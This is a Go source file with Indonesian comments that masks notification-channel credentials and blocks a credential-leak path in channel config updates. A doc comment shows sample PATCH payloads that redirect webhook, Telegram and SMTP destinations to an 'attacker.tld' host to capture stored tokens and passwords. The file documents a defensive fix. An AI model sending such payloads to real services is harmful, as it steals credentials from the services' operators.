package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix adalah prefix penanda untuk nilai yang dimask. Saat API
// menampilkan kembali kredensial, nilai asli diganti dengan nilai berprefix
// ini, dan endpoint update yang menerima nilai berprefix ini akan memahaminya
// sebagai "pertahankan nilai lama di database".
//
// Dipakai prefix, bukan string kosong atau konstanta tetap, agar bisa
// menyelipkan sedikit informasi yang bisa dikenali (lihat MaskedValue),
// supaya pengguna bisa membedakan "ini bot yang mana" tanpa harus menempel
// ulang kuncinya.
const MaskedPrefix = "__masked__"

// MaskedValue menghasilkan nilai mask:
//
//	"__masked__"              nilai asli terlalu pendek, tidak ada petunjuk sama sekali
//	"__masked__:…ab12cd"      menyertakan 6 karakter terakhir nilai asli sebagai petunjuk
//
// Hanya membuka 6 karakter terakhir adalah pilihan yang sengaja: informasi
// pembeda pada alamat webhook ada di bagian akhir (misalnya key WeCom Work
// atau id bot Lark), sementara bagian prefix sama untuk semua bot dan tidak
// punya nilai pembeda. 6 karakter terakhir tidak cukup untuk merekonstruksi
// kredensial, tetapi cukup bagi pengatur untuk mengenali "ini grup saya".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked melaporkan apakah suatu nilai adalah nilai mask (artinya belum
// diubah sejak ditampilkan kembali oleh API).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig mengembalikan salinan konfigurasi dengan field kredensial kanal
// tersebut diganti nilai mask.
//
// Tipe kanal yang tidak dikenal mengembalikan map kosong, bukan konfigurasi
// asli, lebih baik UI menampilkan "konfigurasi tidak tersedia" daripada
// mengembalikan konten asli yang mungkin berisi kredensial saat tipe kanal
// tidak bisa dikenali. Field non-kredensial tetap dipertahankan agar UI bisa
// menampilkannya dengan normal.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Struktur bersarang seperti headers diperlakukan sebagai satu
		// kredensial utuh: memeriksa setiap sub-key satu per satu berarti
		// tiap kanal harus mendeklarasikan lagi aturan "sub-key mana yang
		// kredensial", kompleksitasnya jauh lebih besar dari manfaatnya.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials menyatakan "alamat tujuan berubah,
// tetapi pemanggil tidak menyatakan sikap terhadap field kredensial".
// Dikembalikan sebagai error, bukan dilewatkan diam-diam atau kredensialnya
// dibuang diam-diam, alasannya ada di PrepareConfigUpdate.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // Key tujuan yang berubah
	Missing []string // Key kredensial yang belum dinyatakan secara eksplisit
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "Alamat tujuan (" + strings.Join(e.Changed, ", ") + ") sudah berubah, mohon isi ulang juga field kredensial (" +
		strings.Join(e.Missing, ", ") + "): isi dengan nilai baru, atau kosongkan secara eksplisit jika kredensial tidak diperlukan lagi. " +
		"Kredensial lama hanya berlaku untuk alamat lama, memakainya lagi sama dengan menyerahkannya ke alamat baru."
}

// PrepareConfigUpdate menggabungkan konfigurasi kanal, dan menangani kasus
// sensitif secara keamanan berupa "alamat tujuan berubah".
//
// Fungsi ini menggantikan MergeConfig polos pada jalur update kanal, untuk
// menutup jalur eksploitasi yang terbukti bisa dijalankan: alamat tujuan
// (pesan dikirim ke mana) dan kredensial (dikirim atas nama siapa) adalah
// dua kelompok field yang terpisah, sementara MergeConfig selalu menyimpan
// nilai lama di database untuk "key yang tidak disebutkan". Akibatnya,
// siapa pun yang bisa PATCH kanal cukup **mengubah alamat saja, tanpa
// menyinggung kredensial sama sekali**, untuk membuat server mengirim
// kredensial asli dari database ke endpoint yang dia kendalikan sendiri:
//
//	webhook  {config:{url:"https://attacker.tld"}}  -> header Authorization asli ikut terkirim
//	telegram {config:{base_url:"https://attacker.tld"}} -> /bot<Token asli>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    -> username dan password diserahkan setelah STARTTLS
//
// Jalur ini sepenuhnya diam-diam, tidak bergantung pada redirect (jadi
// menolak loncatan antar host pun tidak bisa mencegahnya), dan langsung
// menembus tujuan mekanisme mask di package ini, yaitu "kredensial tidak
// ditampilkan kembali ke browser".
//
// Aturan: begitu salah satu key tujuan diubah ke nilai baru, pemanggil wajib
// menyatakan sikap secara eksplisit untuk **setiap** key kredensial:
//   - memberi nilai baru -> pakai nilai baru
//   - mengirim string kosong secara eksplisit -> field itu tidak lagi butuh kredensial (makna "dikosongkan" dipertahankan)
//   - mengirim balik nilai mask apa adanya / tidak menyebut key itu sama sekali -> ditolak
//
// Kasus ketiga juga ditolak karena makna "nilai mask" justru adalah
// "pakai kredensial lama", dan kredensial lama hanya berlaku untuk alamat
// lama. Di sini sengaja tidak dilakukan "buang kredensial otomatis", karena
// untuk field kredensial opsional (headers pada webhook, password pada
// email) itu akan diam-diam berubah jadi "autentikasi sudah hilang tapi API
// tetap mengembalikan 200", yang jauh lebih sulit dilacak daripada sekadar
// error. Lebih baik operator mengisi ulang sekali lagi.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("tipe kanal %q belum terdaftar", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// Jika nilai kredensial yang bukan string (misalnya headers pada webhook
	// yang berupa objek) berisi literal mask di dalamnya, itu berarti
	// pemanggil menyelipkan sentinel "pertahankan nilai lama" ke dalam
	// struktur. MergeConfig hanya mengenali mask jika berupa "string dan
	// berprefix", bentuk seperti ini akan disimpan apa adanya sebagai objek
	// biasa, sehingga literal "__masked__" benar-benar tersimpan di database
	// dan autentikasi berikutnya diam-diam gagal tanpa error apa pun. Lebih
	// baik ditolak sejak awal.
	//
	// Pemeriksaan ini harus ditaruh **paling awal**: ketika alamat tidak
	// berubah, fungsi akan return lebih dulu, kalau diletakkan di belakang
	// berarti hanya menutup jalur "alamat berubah" saja (versi pertama salah
	// menaruhnya di sini, dan langsung tertangkap oleh test).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Cari key tujuan yang benar-benar diubah. Nilai mask berarti "tidak berubah".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Alamat tidak berubah, lakukan penggabungan biasa (nilai mask
		// mempertahankan nilai lama, string kosong mengosongkan, sisanya ditimpa).
		return MergeConfig(stored, incoming), nil
	}

	// Alamat berubah: wajib ada sikap eksplisit untuk setiap key kredensial.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers menolak pengiriman sentinel mask yang diselipkan
// di dalam struktur non-string.
//
// Prasyarat mekanisme mask adalah "seluruh nilai memang berupa string".
// Field objek seperti headers pada webhook hanya bisa dimask secara utuh
// (ditulis sebagai string "__masked__") atau dikirim secara utuh;
// menyelipkan sentinel ke dalam objek tidak bisa menyatakan "tidak berubah"
// dan malah akan tersimpan ke database sebagai nilai asli.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("isi field %s mengandung tanda mask %q: field ini hanya boleh dikosongkan seluruhnya untuk tetap memakai nilai lama, atau dikirim seluruhnya dengan nilai baru, tidak boleh menyelipkan placeholder mask di dalam struktur",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue membandingkan apakah dua nilai konfigurasi setara.
// Perbandingan lewat serialisasi JSON dipakai sekaligus untuk menangani
// perbedaan tipe, port yang dikirim frontend berupa number, sementara yang
// dibaca kembali dari database berupa float64, perbandingan == langsung bisa
// salah.
//
// "Kosong" harus dinormalisasi dulu sebelum dibandingkan: string kosong dan
// "key tidak ada" adalah state yang sama dalam model konfigurasi ini, karena
// MergeConfig memperlakukan string kosong sebagai pengosongan eksplisit dan
// langsung menghapus key tersebut. Tanpa normalisasi, field tujuan opsional
// yang selalu dibiarkan kosong (base_url pada Telegram adalah satu-satunya
// field seperti ini: kosong berarti pakai alamat resmi) akan melewati jalur
// ini:
//
//	saat dibuat, tersimpan base_url:""  ->  penyimpanan pertama key-nya dihapus MergeConfig
//	-> penyimpanan kedua, incoming berisi "", stored tidak punya key-nya, dinilai "alamat berubah"
//	-> kredensial berupa nilai mask -> 400 "alamat tujuan sudah berubah, mohon isi ulang field kredensial"
//
// Sejak itu setiap penyimpanan akan gagal terus, kecuali pengguna menempel
// ulang Bot Token-nya, padahal dia tidak mengubah apa pun.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue menentukan apakah suatu nilai konfigurasi "kosong".
// Kriterianya harus sama dengan penentuan pengosongan di MergeConfig
// (strings.TrimSpace(s) == ""), kalau tidak akan muncul celah "MergeConfig
// menganggap harus dihapus, sameConfigValue menganggap masih ada nilainya".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig menggabungkan incoming ke atas stored, dipakai untuk
// memperbarui konfigurasi kanal.
//
// Aturan:
//   - key di incoming yang nilainya mask -> pertahankan nilai asli stored (pengguna tidak mengubah field ini)
//   - key di incoming yang nilainya string kosong -> dianggap pengosongan eksplisit, key dihapus
//   - key lainnya -> ditimpa dengan nilai dari incoming
//   - key yang ada di stored tapi tidak ada di incoming -> dipertahankan (makna update sebagian)
//
// Perlu dipastikan apakah string kosong dianggap "pengosongan": form di
// frontend mengirim field yang tidak diisi sebagai string kosong, jika itu
// ditulis sebagai nilai valid, field yang seharusnya "dikosongkan untuk
// mempertahankan nilai lama" justru benar-benar terhapus. Di sini dipilih
// perlakuan pengosongan eksplisit, karena saat pengguna ingin menghapus
// field yang nilainya salah, tidak ada cara lain untuk menyatakannya
// (menghapus field bisa membedakan "tidak diberikan" dari "diberi nilai
// kosong", tetapi UI tidak memanfaatkan perbedaan itu).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // nilai mask = tidak diubah, pertahankan stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
